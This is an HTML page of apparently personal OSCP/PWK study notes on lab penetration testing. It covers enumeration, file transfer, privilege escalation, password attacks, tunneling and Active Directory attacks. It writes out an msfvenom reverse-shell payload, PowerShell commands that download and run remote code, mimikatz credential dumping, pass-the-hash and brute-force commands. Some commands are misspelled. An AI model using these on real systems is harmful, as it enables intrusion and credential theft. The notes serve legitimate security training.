+<h5 id="Nmap-NFS-NSE-Scripts"><a href="#Nmap-NFS-NSE-Scripts" class="headerlink" title="Nmap NFS NSE Scripts"></a>Nmap NFS NSE Scripts</h5><p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;nfs*</p>
+<h4 id="SMTP-Enumeration-Simple-Mail-Transport-Protocol"><a href="#SMTP-Enumeration-Simple-Mail-Transport-Protocol" class="headerlink" title="SMTP Enumeration(Simple Mail Transport Protocol)"></a>SMTP Enumeration(Simple Mail Transport Protocol)</h4><p>this protocol supports several interesting commands such as VRFY and EXPN<br>VRFY request ask the server to verify an email address<br>EXPN request ask the server for the membership of a mailing list<br>    nc -nv 10.11.1.217 25<br>    VRFY root<br>    VRFY idontexist</p>
+<h4 id="SNMP-Enumeration-Simple-Network-Management-protocol"><a href="#SNMP-Enumeration-Simple-Network-Management-protocol" class="headerlink" title="SNMP Enumeration(Simple Network Management protocol)"></a>SNMP Enumeration(Simple Network Management protocol)</h4><h5 id="The-SNMP-MIB-Tree"><a href="#The-SNMP-MIB-Tree" class="headerlink" title="The SNMP MIB Tree"></a>The SNMP MIB Tree</h5><h5 id="Scanning-for-SNMP"><a href="#Scanning-for-SNMP" class="headerlink" title="Scanning for SNMP"></a>Scanning for SNMP</h5><p><code>nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt</code><br><code>-sU</code> is to perform UDP scanning<br><code>--open</code> is to limit the output to only display open ports<br>alternatively,we can use a tool such as onesixtyone<br>First we must build text files contaoning community strings and the ip addresses we wish to scan<br>    echo public &gt; community<br>    echo private &gt;&gt; community<br>    echo manager &gt;&gt; community<br>    for ip in $(seq 1 254); do echo 10.11.1.$ip; done &gt; ips<br>    onesixtyone -c community -i ips</p>
+<h5 id="windows-SNMP-Enumeration-Example"><a href="#windows-SNMP-Enumeration-Example" class="headerlink" title="windows SNMP Enumeration Example"></a>windows SNMP Enumeration Example</h5><ul>
+<li>enumerating entire MIB tree<br><code>snmpwalk -c public -v1 -t 10 10.11.1.14</code>:-c is to specify the community string, -v is to specify the SNMP version number, -t 10 is to increase the timeout period to 10 seconds</li>
+<li>enumerating Windows Users<br><code>snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.77.1.2.25</code></li>
+<li>enumerating running windows processes<br><code>snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2</code></li>
+<li>enumerating open TCP ports<br><code>snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3</code></li>
+<li>enumerating installed software<br><code>snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2</code></li>
+</ul>
+<h3 id="8-Vulnerability-scanning"><a href="#8-Vulnerability-scanning" class="headerlink" title="8.Vulnerability scanning"></a>8.Vulnerability scanning</h3><h4 id="how-vulnerability-scanners-work"><a href="#how-vulnerability-scanners-work" class="headerlink" title="how vulnerability scanners work"></a>how vulnerability scanners work</h4><ul>
+<li><ol>
+<li>Detect if a target is up and running</li>
+</ol>
+</li>
+<li>2.Conduct a full or partial port scan,depending on the configuration</li>
+<li>3.identify the operating system using common fingerprinting techniques</li>
+<li>4.attemp to identify running services with common techniques such as banner grabbing,service behavior identification,or file discovery</li>
+<li>5.execute a signature-matching process to discover vulnerabilities</li>
+</ul>
+<h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p><code>apt install ./Nessus-X.X.X.deb</code><br><code>/etc/init.d/nessusd start</code><br>accept the self-signed certificate</p>
+<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>e.g. <code>nmap --script vuln 10.11.1.10</code>—-this will run all scripts in the “vuln” category against a target in the PWK labs</p>
+<h3 id="9-web-application-attacks"><a href="#9-web-application-attacks" class="headerlink" title="9.web application attacks"></a>9.web application attacks</h3><h4 id="web-application-Assessment-methodology"><a href="#web-application-Assessment-methodology" class="headerlink" title="web application Assessment methodology"></a>web application Assessment methodology</h4><h4 id="web-application-Enumeration"><a href="#web-application-Enumeration" class="headerlink" title="web application Enumeration"></a>web application Enumeration</h4><ul>
+<li>programming language and frameworks</li>
+<li>web server software</li>
+<li>database software</li>
+<li>server operating system</li>
+</ul>
+<h5 id="inspecting-URLs"><a href="#inspecting-URLs" class="headerlink" title="inspecting URLs"></a>inspecting URLs</h5><p>File extensions,which sometimes a part of a URL,can reveal the programming language the application was writtern in.Some of these,like .php,or vary based on the frameworks in use.For example,a Java-based web application migth use .jsp,.do,or .html</p>
+<h5 id="inspecting-Page-Content"><a href="#inspecting-Page-Content" class="headerlink" title="inspecting Page Content"></a>inspecting Page Content</h5><h5 id="viewing-response-headers"><a href="#viewing-response-headers" class="headerlink" title="viewing response headers"></a>viewing response headers</h5><h5 id="inspecting-sitemaps"><a href="#inspecting-sitemaps" class="headerlink" title="inspecting sitemaps"></a>inspecting sitemaps</h5><p>the two most common sitemap filenames are robots.txt and sitemap.xml</p>
+<h5 id="locating-administration-consoles"><a href="#locating-administration-consoles" class="headerlink" title="locating administration consoles"></a>locating administration consoles</h5><h4 id="web-application-assessment-tools"><a href="#web-application-assessment-tools" class="headerlink" title="web application assessment tools"></a>web application assessment tools</h4><ul>
+<li>DIRB<br><code>dirb http://www.megacorpone.com -r -z 10</code>:-r is to scan non-recursively,-z 10 is to add a 10 millisecond delay to each request</li>
+<li>BurpSuite</li>
+<li>Nikto<br><code>nikto -host=http://www.megacorpone.com -maxtime=30s</code>:-maxtime&#x3D;30s is to limit the scan duration to 30 seconds</li>
+</ul>
+<h4 id="exploiting-web-based-vulnerabilities"><a href="#exploiting-web-based-vulnerabilities" class="headerlink" title="exploiting web-based vulnerabilities"></a>exploiting web-based vulnerabilities</h4><ul>
+<li>exploiting admin consoles</li>
+<li>XSS</li>
+<li>directory traversal vulnerabilities</li>
+<li>file inclusion vulnerabilities</li>
+<li>sql injection</li>
+</ul>
+<h4 id="extra-miles"><a href="#extra-miles" class="headerlink" title="extra miles"></a>extra miles</h4><h3 id="10-Buffer-Overflows"><a href="#10-Buffer-Overflows" class="headerlink" title="10.Buffer Overflows"></a>10.Buffer Overflows</h3><h4 id="x86-Architecture"><a href="#x86-Architecture" class="headerlink" title="x86 Architecture"></a>x86 Architecture</h4><ul>
+<li>program memory</li>
+</ul>
+<h4 id="buffer-overflow-walkthrough"><a href="#buffer-overflow-walkthrough" class="headerlink" title="buffer overflow walkthrough"></a>buffer overflow walkthrough</h4><h3 id="11-windows-buffer-overflows"><a href="#11-windows-buffer-overflows" class="headerlink" title="11.windows buffer overflows"></a>11.windows buffer overflows</h3><h4 id="discovering-the-vulnerability"><a href="#discovering-the-vulnerability" class="headerlink" title="discovering the vulnerability"></a>discovering the vulnerability</h4><ul>
+<li>1.fuzzing the http protocol</li>
+</ul>
+<h4 id="win32-buffer-overflow-exploitation"><a href="#win32-buffer-overflow-exploitation" class="headerlink" title="win32 buffer overflow exploitation"></a>win32 buffer overflow exploitation</h4><ul>
+<li>DEP:Data Execution Prevention</li>
+<li>ASLR:Address Space Layout Randomization</li>
+<li>CFG:Control Flow Guard</li>
+</ul>
+<h3 id="12-Linux-buffer-overflows"><a href="#12-Linux-buffer-overflows" class="headerlink" title="12.Linux buffer overflows"></a>12.Linux buffer overflows</h3><h3 id="13-Client-Side-Attacks"><a href="#13-Client-Side-Attacks" class="headerlink" title="13.Client-Side Attacks"></a>13.Client-Side Attacks</h3><h4 id="know-ypur-target"><a href="#know-ypur-target" class="headerlink" title="know ypur target"></a>know ypur target</h4><ul>
+<li><ol>
+<li>passive client information gathering</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>active client information gathering</li>
+</ol>
+</li>
+</ul>
+<h4 id="leveraging-HTML-applications"><a href="#leveraging-HTML-applications" class="headerlink" title="leveraging HTML applications"></a>leveraging HTML applications</h4><p>If a file is created with the extension of .hta instead of .html,Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program.<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta</code></p>
+<h4 id="exploiting-microsoft-office"><a href="#exploiting-microsoft-office" class="headerlink" title="exploiting microsoft office"></a>exploiting microsoft office</h4><h4 id="evading-protected-view"><a href="#evading-protected-view" class="headerlink" title="evading protected view"></a>evading protected view</h4><h3 id="14-Locating-public-exploits"><a href="#14-Locating-public-exploits" class="headerlink" title="14.Locating public exploits"></a>14.Locating public exploits</h3><h4 id="A-word-of-caution"><a href="#A-word-of-caution" class="headerlink" title="A word of caution"></a>A word of caution</h4><img src="/2022/07/28/oscp/jmpcode.png">
+#### Searching for exploits
++ online exploit resources
+ - 1.The exploit database
+ - 2.SecurityFocus exploit archives
+ - 3.Packet storm
++ offline exploit resources
+ - 1.SearchSploit
+ - 2.Nmap NSE Scripts
+ - 3.The Browser Exploitation Framework(BeEF)
+ - 4.The Metasploit Framework
+#### putting it all together
+`nmap 10.11.0.128 -p- -sV -vv --open --reason`
+### 15.Fixing Exploits
+#### Fixing Memory Corruption Exploits
+#### Fixing Web Exploits
+### 16.File Transfers
++ 1.setup-ftp.sh
+    #!/bin/bash
+    
+<pre><code>groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd offsec -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+systemctl restart pure-ftpd
+</code></pre>
+<ul>
+<li>2.upgrading a non-interactive shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li>
+</ul>
+<h4 id="transfering-files-with-windows-hosts"><a href="#transfering-files-with-windows-hosts" class="headerlink" title="transfering files with windows hosts"></a>transfering files with windows hosts</h4><h5 id="non-interactive-ftp-download"><a href="#non-interactive-ftp-download" class="headerlink" title="non-interactive ftp download"></a>non-interactive ftp download</h5><pre><code>echo open 10.11.0.4 21 &gt; ftp.txt
+echo USER offsec &gt;&gt; ftp.txt(usernname)
+echo lab &gt;&gt; ftp.txt(password)
+echo bin &gt;&gt; ftp.txt
+echo GET nc.exe &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+</code></pre>
+<p><code>ftp -v -n -s:ftp.txt</code>:-v is to suppress any returned output,-n is to suppress automatic login,-s is to indicate the name of command line</p>
+<h5 id="windows-downloads-using-scripting-languages"><a href="#windows-downloads-using-scripting-languages" class="headerlink" title="windows downloads using scripting languages"></a>windows downloads using scripting languages</h5><ul>
+<li><p>1.wget.vbs<br>  echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs<br>  echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs<br>  echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs<br>  echo Err.Clear &gt;&gt; wget.vbs<br>  echo Set http &#x3D; Nothing &gt;&gt; wget.vbs<br>  echo Set http &#x3D; CreateObject(“WinHttp.WinHttpRequest.5.1”) &gt;&gt; wget.vbs<br>  echo If http Is Nothing Then Set http &#x3D; CreateObject(“WinHttp.WinHttpRequest”) &gt;&gt; wget.vbs<br>  echo If http Is Nothing Then Set http &#x3D; CreateObject(“MSXML2.ServerXMLHTTP”) &gt;&gt; wget.vbs<br>  echo If http Is Nothing Then Set http &#x3D; CreateObject(“Microsoft.XMLHTTP”) &gt;&gt; wget.vbs<br>  echo http.Open “GET”,strURL,False &gt;&gt; wget.vbs<br>  echo http.Send &gt;&gt; wget.vbs<br>  echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs<br>  echo Set http &#x3D; Nothing &gt;&gt; wget.vbs<br>  echo Set fs &#x3D; CreateObject(“Scripting.FileSystemObject”) &gt;&gt; wget.vbs<br>  echo Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs<br>  echo strData &#x3D; “” &gt;&gt; wget.vbs<br>  echo strBuffer &#x3D; “” &gt;&gt; wget.vbs<br>  echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br>  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs<br>  echo Next &gt;&gt; wget.vbs<br>  echo ts.Close &gt;&gt; wget.vbs</p>
+</li>
+<li><p>2.wget.ps1<br>  #! &#x2F;usr&#x2F;bin&#x2F;python</p>
+<p>  import sys</p>
+<p>  if len(sys.argv) !&#x3D;3:<br>  print “Usage: gen_ps1_wget.py <http_server> <file_to_download>“<br>  sys.exit(0)<br>  print “\n”<br>  print “Copy and paste the following in to the host:”<br>  print “\n”<br>  print “echo $storageDir &#x3D; $pwd &gt; wget.ps1”<br>  print “echo $webclient &#x3D; New-Object System.Net.WebClient &gt;&gt; wget.ps1”<br>  print “echo $url &#x3D; ‘http:&#x2F;&#x2F;%s&#x2F;%s’ &gt;&gt; wget.ps1”%(sys.argv[1],sys.argv[2])<br>  print “echo $file &#x3D; ‘%s’ &gt;&gt; wget.ps1” % sys.argv[2]<br>  print “echo $webclient.DownloadFile($url,$file) &gt;&gt; wget.ps1”<br>  print “\n”</file_to_download></http_server></p>
+</li>
+</ul>
+<p><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</code><br><code>powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.0.4/xxx.exe&#39;,&#39;new-exploit.exe&#39;)</code><br><code>powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.0.4/helloworld.ps1&#39;)</code></p>
+<h5 id="windows-downloads-with-exe2hex-and-powershell"><a href="#windows-downloads-with-exe2hex-and-powershell" class="headerlink" title="windows downloads with exe2hex and powershell"></a>windows downloads with exe2hex and powershell</h5><p><code>exe2hex -x nc.exe -p nc.cmd</code><br><code>head nc.cmd</code> and copy this script to the bind shell</p>
+<h5 id="windows-uploads-using-windows-scripting-languages"><a href="#windows-uploads-using-windows-scripting-languages" class="headerlink" title="windows uploads using windows scripting languages"></a>windows uploads using windows scripting languages</h5><p>php code<br>    <?php
+    $uploaddir = '/var/www/uploads/';
+    $uploadfile = $uploaddir.$_FILES['file']['name'];
+    move_uploaded_file($_FILES['file']['tmp_name'],$uploadfile)
+    ?></p>
+<h5 id="uploading-files-with-TFTP"><a href="#uploading-files-with-TFTP" class="headerlink" title="uploading files with TFTP"></a>uploading files with TFTP</h5><h3 id="17-Antivirus-Evasion"><a href="#17-Antivirus-Evasion" class="headerlink" title="17.Antivirus Evasion"></a>17.Antivirus Evasion</h3><h4 id="methods-of-detecting-malicious-code"><a href="#methods-of-detecting-malicious-code" class="headerlink" title="methods of detecting malicious code"></a>methods of detecting malicious code</h4><ul>
+<li>1.signature-based detection(blacklist technology)</li>
+<li>2.heuristic and behavioral-based detection</li>
+</ul>
+<h4 id="bypassing-antivirus-detection"><a href="#bypassing-antivirus-detection" class="headerlink" title="bypassing antivirus detection"></a>bypassing antivirus detection</h4><h5 id="On-Disk-Evasion"><a href="#On-Disk-Evasion" class="headerlink" title="On-Disk Evasion"></a>On-Disk Evasion</h5><ul>
+<li>1.Packers</li>
+<li>2.Obfuscators</li>
+<li>3.Crypters</li>
+<li>4.Software protectors</li>
+</ul>
+<h5 id="In-Memory-Evasion"><a href="#In-Memory-Evasion" class="headerlink" title="In-Memory Evasion"></a>In-Memory Evasion</h5><ul>
+<li>1.Remote Process Memory Injection</li>
+<li>2.Reflective DLL Injection</li>
+<li>3.Process Hollowing</li>
+<li>4.Inline hooking</li>
+</ul>
+<h5 id="shelter"><a href="#shelter" class="headerlink" title="shelter"></a>shelter</h5><h3 id="18-Privilege-Escalation"><a href="#18-Privilege-Escalation" class="headerlink" title="18.Privilege Escalation"></a>18.Privilege Escalation</h3><h4 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h4><h5 id="Manual-Enumeration"><a href="#Manual-Enumeration" class="headerlink" title="Manual Enumeration"></a>Manual Enumeration</h5><ul>
+<li>Enumerating Users<br><code>whoami</code><br><code>net user</code>(windows)<br><code>id</code>(linux)<br><code>cat /etc/passwd</code>(linux)</li>
+<li>Enumerating the hostname<br><code>hostname</code></li>
+<li>Enumerating the operating system version and architecture<br><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;</code>(windows):&#x2F;B is to match patterns at the beginning of a line,&#x2F;C: is to specify a particular search string<br><code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>unmae -a</code></li>
+<li>Enumerating running processes and services<br><code>tasklist /SVC</code><br><code>ps aux</code></li>
+<li>Enumerating networking information<br><code>ipconfig /all</code>(windows)<br><code>route print</code>(windows)<br><code>netstat -ano</code>(windows)<br><code>ip a</code>(linux)<br><code>/sbin/route</code>(linux)<br><code>ss -anp</code>(linux)</li>
+<li>enumerating firewall status and rules<br><code>netsh advfirewall show currentprofile</code>(windows)<br><code>netsh advfirewall firewall show rule name=all</code></li>
+<li>Enumerating Scheduled Tasks<br><code>schtasks /query /fo LIST /v</code>(linux):&#x2F;query is to displays tasks,&#x2F;FO LIST sets the output format to a simple list,&#x2F;v is to request verbose output<br><code>ls -lah /etc/cron*</code><br><code>cat /etc/crontab</code></li>
+<li>Enumerating installed applications and patch levels<br><code>wmic product get name,version,vendor</code><br><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code><br><code>dkpg -l</code>(linux)</li>
+<li>Enumerating readable&#x2F;writable files and directories<br><code>accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files&quot;</code>:-u to suppress errors,-w to search for write access permissions,-s to perform a recursive search<br><code>Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</code><br><code>find / -writable -type d 2&gt;/dev/null</code>(linux):type -d to locate directories</li>
+<li>Enumerating Unmounted Disks<br><code>mountvol</code>(windows)<br><code>cat /etc/fstab</code>(linux)<br><code>mount</code>(linux)<br><code>/bin/lsblk</code></li>
+<li>Enumerating device drivers and kernel modules<br><code>powershell</code> -&gt; <code>driverquery.exe /v /fo csv | ConvertForm-CSV | Select-Object &#39;Display Name&#39;,&#39;Start Mode&#39;,Path</code><br><code>powershell</code> -&gt; <code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DriverName,DriverVersion,Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</code><br><code>lsmod</code>(linux)<br><code>/sbin/modinfo libata</code>(linux)</li>
+<li>Enumerating Binaries that autoElevate<br><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code><br><code>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</code><br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
+</ul>
+<h5 id="automated-enumeration"><a href="#automated-enumeration" class="headerlink" title="automated enumeration"></a>automated enumeration</h5><p><code>windows-privesc-check2.exe --dump -G</code><br><code>./unix-privesc-check</code><br><code>./unix-privesc-check standard &gt; output.txt</code></p>
+<h3 id="19-Password-attacks"><a href="#19-Password-attacks" class="headerlink" title="19.Password attacks"></a>19.Password attacks</h3><h4 id="wordlists"><a href="#wordlists" class="headerlink" title="wordlists"></a>wordlists</h4><p>&#x2F;usr&#x2F;share&#x2F;wordlists<br><code>cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</code>:locates words with a minimum of six characters,and write the wordlist to a custom file<br><code>John the Ripper</code>(&#x2F;etc&#x2F;john&#x2F;john.conf)<br><code>john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</code></p>
+<h4 id="brute-force-wordlists"><a href="#brute-force-wordlists" class="headerlink" title="brute force wordlists"></a>brute force wordlists</h4><p><code>crunch 8(minimum) 8(maximum) -t ,(upper case alpha characters)@@(lower case alpha characeters)^^(special characters including space)%%%(numeric characters)</code><br><code>crunch 4 6 0123456789ABCDEF -o crunch.txt</code><br><code>crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt</code></p>
+<h4 id="common-network-service-attack-methods"><a href="#common-network-service-attack-methods" class="headerlink" title="common network service attack methods"></a>common network service attack methods</h4><h5 id="HTTP-htaccess-Attack-with-Medusa"><a href="#HTTP-htaccess-Attack-with-Medusa" class="headerlink" title="HTTP htaccess Attack with Medusa"></a>HTTP htaccess Attack with Medusa</h5><p><code>medusa -h 10.11.0.22 -u admin -P /usr/share/wordlist/rockyou.txt -M http -m DIR:/admin</code>:-m DIR:&#x2F;admin is to initiate the attack against the htaccess-protected URL,-M is to use an HTTP authentication scheme</p>
+<h5 id="remote-desktop-protocol-attack-with-crowbar"><a href="#remote-desktop-protocol-attack-with-crowbar" class="headerlink" title="remote desktop protocol attack with crowbar"></a>remote desktop protocol attack with crowbar</h5><p><code>crowbar -b rdp -s 10.11.0.4/32 -u admin -C ~/password-file.txt -n 1</code>:-b is to specify the protocol,-s is the target server,-n is the number of threads</p>
+<h5 id="SSH-attack-with-THC-Hydra"><a href="#SSH-attack-with-THC-Hydra" class="headerlink" title="SSH attack with THC-Hydra"></a>SSH attack with THC-Hydra</h5><p><code>hydra -l kali -P /usr/share/wordlist/rockyou.txt ssh://127.0.0.1</code>:-l is to specify the username,and Protocol:&#x2F;&#x2F;ip si to specify the target protocol and IP address respectively</p>
+<h5 id="HTTP-POST-Attack-with-THC-Hydra"><a href="#HTTP-POST-Attack-with-THC-Hydra" class="headerlink" title="HTTP POST Attack with THC-Hydra"></a>HTTP POST Attack with THC-Hydra</h5><p><code>hydra http-form-post -U</code>:-U is to obtain additional information about the required arguments<br><code>hydra 10.11.0.2 http-form-post &quot;/form/frontpage.php:user=admin&amp;pass=^PASS^:INVALID LOGIN&quot; -l admin -P /usr/share/wordlist/rockyou.txt -vV -f</code>:-vV is to request verbose output,-f is to stop the attack when the first successful result is found</p>
+<h4 id="leveraging-password-hashes"><a href="#leveraging-password-hashes" class="headerlink" title="leveraging password hashes"></a>leveraging password hashes</h4><h5 id="retriving-password-hashed"><a href="#retriving-password-hashed" class="headerlink" title="retriving password hashed"></a>retriving password hashed</h5><p><code>hashid c43ee559d69bc7f691fe2fbfe8a5ef0a</code><br><code>minikatz</code><br><code>privilegeg::debug</code><br><code>token::elevate</code><br><code>lsadump::sam</code></p>
+<h5 id="passing-the-hash-in-windows"><a href="#passing-the-hash-in-windows" class="headerlink" title="passing the hash in windows"></a>passing the hash in windows</h5><p><code>pth-winexe -U offsec%xxxxxxxxxxxxxxxx //10.10.11.2 cmd</code></p>
+<h5 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h5><p><code>john hash.txt --format=NT</code><br><code>john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt --format=NT</code><br><code>john --rules --wordlist=/usr/share/wordlist/rockyou.txt hash.txt --format=NT</code></p>
+<h3 id="20-port-redirection-and-tunneling"><a href="#20-port-redirection-and-tunneling" class="headerlink" title="20.port redirection and tunneling"></a>20.port redirection and tunneling</h3><h4 id="port-forwarding"><a href="#port-forwarding" class="headerlink" title="port forwarding"></a>port forwarding</h4><h5 id="RINETD"><a href="#RINETD" class="headerlink" title="RINETD"></a>RINETD</h5><p><code>/etc/rinetd.conf</code>—&gt; <code>bindaddress bindport connectaddress connectport</code> —&gt;<code>0.0.0.0 80 11.10.1.4 80</code></p>
+<h5 id="SSH-tunneling"><a href="#SSH-tunneling" class="headerlink" title="SSH tunneling"></a>SSH tunneling</h5><ul>
+<li>ssh local port forwarding<br><code>ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</code></li>
+<li>ssh remote port forwarding<br><code>ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</code></li>
+<li>ssh dynamic port forwarding<br><code>ssh -N -D 127.0.0.1:8080 student@10.11.0.128</code></li>
+</ul>
+<h5 id="PLINK-exe"><a href="#PLINK-exe" class="headerlink" title="PLINK.exe"></a>PLINK.exe</h5><p><code>plink.exe -ssh -l(username) kali -pw(password) ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</code><br><code>cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</code></p>
+<h5 id="NETSH"><a href="#NETSH" class="headerlink" title="NETSH"></a>NETSH</h5><p><code>netsh interface portproxy add v4tov4 listenport=4445 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110</code><br>#####HTTPTunnel-ing through deep packet inspection<br><code>hts --forward-port localhost:8888 1234</code><br><code>htc --forward-port 8080 10.11.0.128:1234</code></p>
+<h3 id="21-active-directory-attacks"><a href="#21-active-directory-attacks" class="headerlink" title="21.active directory attacks"></a>21.active directory attacks</h3><h4 id="Active-Directory-Theory"><a href="#Active-Directory-Theory" class="headerlink" title="Active Directory Theory"></a>Active Directory Theory</h4><p>Domain Controller(DC)<br>Organizational Units(OU)</p>
+<h4 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h4><h5 id="traditional-approach"><a href="#traditional-approach" class="headerlink" title="traditional approach"></a>traditional approach</h5><p><code>net user</code><br><code>net user /doamin</code><br><code>net user jeff_admin /domain</code><br><code>net group domain</code></p>
+<h5 id="a-modern-approach"><a href="#a-modern-approach" class="headerlink" title="a modern approach"></a>a modern approach</h5><p>powershell<br><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code><br>script:<br>    $domainObj &#x3D; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br>    $PDC &#x3D; ($domainObj.PdcRoleOwner).Name<br>    $SearchString &#x3D; “LDAP:&#x2F;&#x2F;“<br>    $SearchString +&#x3D; $PDC + “&#x2F;“<br>    $DistinguishedName &#x3D; “DC&#x3D;$($domainObj.Name.Replace(‘.’,’,DC&#x3D;’))”<br>    $SearchString +&#x3D; $DistinguishedName<br>    $SearchString</p>
+<pre><code>$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter=&quot;samAccountType=805306368&quot;(&quot;name=Jeff_Admin&quot;)
+$Searcher.FindAll()
+
+Foreach($obj in $Result)
+&#123;
+    Foreach($prop in $obj.Properties)
+    &#123;
+        $prop
+    &#125;
+    Write-Host &quot;------------------------&quot;
+&#125;
+</code></pre>
+<h5 id="resolving-nested-groups"><a href="#resolving-nested-groups" class="headerlink" title="resolving nested groups"></a>resolving nested groups</h5><p>script:<br>    $domainObj &#x3D; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br>    $PDC &#x3D; ($domainObj.PdcRoleOwner).Name<br>    $SearchString &#x3D; “LDAP:&#x2F;&#x2F;“<br>    $SearchString +&#x3D; $PDC + “&#x2F;“<br>    $DistinguishedName &#x3D; “DC&#x3D;$($domainObj.Name.Replace(‘.’,’,DC&#x3D;’))”<br>    $SearchString +&#x3D; $DistinguishedName<br>    $SearchString</p>
+<pre><code>$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter=&quot;(objectClass=Group)&quot;---&gt;&quot;(name=Secret_Group)&quot;---&gt;&quot;(name=Nested_Group)&quot;---&gt;&quot;(name=Another_Nested_Group)&quot;
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+&#123;
+    $obj.Properties.name---&gt;$obj.Properties.member
+&#125;
+</code></pre>
+<h5 id="Currently-Logged-on-Users"><a href="#Currently-Logged-on-Users" class="headerlink" title="Currently Logged on Users"></a>Currently Logged on Users</h5><ul>
+<li>NetWkstaUserEnum</li>
+<li>NetSessionEnum<br><code>Import-Module .\PowerView.ps1</code><br><code>Get-NetLoggedon -ComputerName client251</code><br><code>Get-NetSession -ComputerName dc01</code></li>
+</ul>
+<h5 id="Enumeration-Through-Service-Principal-Names"><a href="#Enumeration-Through-Service-Principal-Names" class="headerlink" title="Enumeration Through Service Principal Names"></a>Enumeration Through Service Principal Names</h5><h4 id="Active-Directory-Authentication"><a href="#Active-Directory-Authentication" class="headerlink" title="Active Directory Authentication"></a>Active Directory Authentication</h4><h5 id="NTLM-Authentication"><a href="#NTLM-Authentication" class="headerlink" title="NTLM Authentication"></a>NTLM Authentication</h5><h5 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h5><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266491528">https://zhuanlan.zhihu.com/p/266491528</a></p>
+<h5 id="Cached-Credential-Storage-and-Retrieval"><a href="#Cached-Credential-Storage-and-Retrieval" class="headerlink" title="Cached Credential Storage and Retrieval"></a>Cached Credential Storage and Retrieval</h5><p>mimikatz<br><code>privilege::debug</code><br><code>sekurlsa::logonpasswords</code><br><code>sekualsa::tickets</code></p>
